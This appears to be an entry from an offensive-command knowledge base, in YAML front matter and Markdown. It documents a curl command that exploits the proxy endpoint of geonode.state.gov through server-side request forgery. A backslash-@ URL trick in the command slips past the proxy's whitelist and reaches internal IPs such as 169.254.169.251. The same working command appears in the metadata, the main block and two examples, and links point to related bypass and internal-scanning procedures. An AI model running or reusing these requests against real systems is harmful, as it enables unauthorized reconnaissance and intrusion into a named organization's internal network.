---
data: >-
  curl -X GET
  "https://geonode.state.gov/proxy/?url=http://169.254.169.251\\@geonode.state.gov"
  -H "Host: geonode.state.gov" -H "Cookie: [redacted]" -H "User-Agent:
  Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like
  Gecko) Chrome/106.0.5249.62 Safari/537.36" -H "Accept:
  text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
  -H "Accept-Encoding: gzip, deflate" -H "Accept-Language:
  en-GB,en-US;q=0.9,en;q=0.8" -H "Connection: close"
tags:
  - ssrf
  - test
  - scanning
type: command
output: null
executor: bash
platforms:
  - Linux
  - Windows
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:08:54.992Z'
id: 7cc6e99e-830d-4278-a9a8-5e0cefbed03c
verified: false
validated: true
submitted: true
---
# test-nonexistent-internal-ip

## Command

```bash
curl -X GET "https://geonode.state.gov/proxy/?url=http://169.254.169.251\\@geonode.state.gov" -H "Host: geonode.state.gov" -H "Cookie: [redacted]" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: en-GB,en-US;q=0.9,en;q=0.8" -H "Connection: close"
```

## Description

Tests SSRF bypass on a non-existent internal IP to observe unreachable host response for scanning differentiation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| url | http://bogus-ip\\@whitelisted-host | Yes |
| Host | Target host | Yes |
| User-Agent | Browser UA | Yes |

## Examples

### Basic Usage

```bash
curl -X GET "https://geonode.state.gov/proxy/?url=http://169.254.169.251\\@geonode.state.gov" -H "Host: geonode.state.gov"
```

### Advanced Usage

```bash
curl -X GET "https://geonode.state.gov/proxy/?url=http://192.0.2.1\\@geonode.state.gov" -H "Host: geonode.state.gov" -v
```

## Expected Output

HTTP 502 Bad Gateway, confirming host does not exist.

## Related

- [[commands/bypass-whitelist-to-internal-ip]]
- [[procedures/Bypass-SSRF-Whitelist-for-Internal-Scanning]]
